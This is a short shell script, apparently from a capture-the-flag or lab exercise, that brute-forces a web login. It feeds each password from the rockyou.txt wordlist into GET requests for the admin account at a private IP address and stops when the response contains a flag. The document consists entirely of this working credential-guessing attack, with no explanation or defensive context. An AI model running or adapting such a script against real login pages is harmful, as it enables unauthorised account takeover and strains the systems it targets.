#!/bin/sh

pass=$(cat ~/Desktop/rockyou.txt)
for p in ${pass[@]}
do
	echo "Attempt ${p}"
	FLAG=$(curl -X GET "http://10.12.1.124/?page=signin&username=admin&password=${p}&Login=Login#" | grep 'flag')
	if [ ! -z "$(echo "$FLAG" | tr -d '\n')" ]
	then
		echo "Success !"
		echo ${p}
		echo ${FLAG}
		exit
	fi
done